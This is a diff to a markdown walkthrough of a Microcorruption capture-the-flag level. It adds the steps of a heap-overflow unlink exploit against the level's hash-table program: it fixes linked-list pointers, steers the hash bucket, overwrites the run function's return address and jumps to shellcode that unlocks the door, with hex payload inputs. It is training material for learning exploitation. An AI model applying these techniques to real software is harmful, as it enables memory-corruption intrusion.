@@ -85,7 +85,7 @@ Now rehash should be recalled and we can get to the call to free.
 
 Uh oh. We caused the program to abort. It seemed to thing the heap was exhausted. This should only happen when trying to allocate a new block of memory. Let's backtrace and see where the error happened.
 
-The error happended on the first call to malloc in rehash (address 0x490a). It looks like the malloc function will move along the linked list of blocks on the heap to check for unallocated regions large enough to allocate the needed size. If any of the next pointers point to a lower address, the program throws an error. Fortunately the malloc function doesn't check backwards using the previous nodes of the linked list. This is easy to fix. We just need to maintain the integrity of the forward linked list chain. It looks like this value was 0x50fc before we overwrote it. Lets add it to our exploit. The exploit now looks like this:
+The error happended on the first call to malloc in rehash (address 0x490a). It looks like the malloc function will move along the linked list of blocks on the heap to check for unallocated regions large enough to allocate the needed size. If any of the next pointers point to a lower address, the program throws an error. Fortunately the malloc function doesn't check backwards using the previous nodes of the linked list. This is easy to fix. We just need to maintain the integrity of the forward linked list chain. It looks like the value was 0x50fc before we overwrote it. Lets add it to our exploit. The exploit now looks like this:
 
 ```
 new AAAAAAAAAAAAAAAA 0
@@ -102,7 +102,72 @@ new F 0
 new G 0
 ```
 
-TODO pick up here
+![memory2](./screenshots/memory2.png)
+
+Now we have another problem.  Our entry moved out of the first index and we aren't overflowing the heap anymore. We need to make sure the calculated hash of the username % 8 equals 0.
+
+Like I mentioned above, we only have 8 indexes in our hash table and the last character of the username has the most influence on the hash value. Instead of calculating the hash ourselves, we can just guess and check with up to 8 values. We also don't need 16 bytes in the username field. We only care about overwriting the previous pointer, next pointer, and size (6 bytes). Let's use the 7th byte to control which index the entry will fall into. Start with 0x41 and increase until we land in the index we care about.
+
+```
+6e657720 4141 fc50 4141 41 2030
+6e657720 4141 fc50 4141 42 2030
+6e657720 4141 fc50 4141 43 2030
+6e657720 4141 fc50 4141 44 2030        This is the entry we want
+```
+
+![memory3](./screenshots/memory3.png)
+
+We found it. Now lets attempt to overflow the heap and get to the free call.
+
+```
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+(hex) 6e657720 4141 fc50 4141 44 2030
+new B 0
+new C 0
+new D 0
+new E 0
+new F 0
+new G 0
+```
+
+![free](./screenshots/free.png)
+
+Success. We got to the free call at address 0x499e.
+
+Now we need to figure out what we are going to overwrite with our unlink exploit. The exploit will overwrite 2 bytes, but clobber the 4 bytes before. The most likely candidate is overwriting a return address to jump to instructions that will unlock the door. There are no unlock_door functions like in previous programs. We could use a jump to a call to INT such as in the getsn or puts functions, but we would need to set 4 bytes on the stack and we can only write 2 reliably. The best option is to jump to shellcode that we provide with our user input. However, this creates another problem. The add_to_table function will not copy null or 0x20 bytes to the heap.
+
+Take a look at the end of the run function.
+
+![run](./screenshots/run.png)
+
+If the user command is not "access" or "new", the function will jump to address 0x4cbe and return from the run function. The return address is stored at address 0x43f6 on the stack. This is what we want to overwrite. To get here we just need to provide a user input where the first character is not "a" or "n". Then we can include our shellcode, and use the overwritten return address to return to the unlock door instructions on the stack. Use the shellcode from [Bangalore](https://github.com/networking101/microcorruption/tree/main/Bangalore).
+
+
+With this new step added, our exploit will look like this.
+
+```
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+new AAAAAAAAAAAAAAAA 0
+(hex) 6e657720 4141 fc50 4141 44 2030
+new B 0
+new C 0
+new D 0
+new E 0
+new F 0
+new G 0
+(hex) 42424242 324000ffb0121000
+```
+
+
+
+
 
 * available commands are "access" and "new". Anything else will cause run function to return and exit program
 * The hash table is stored on the heap
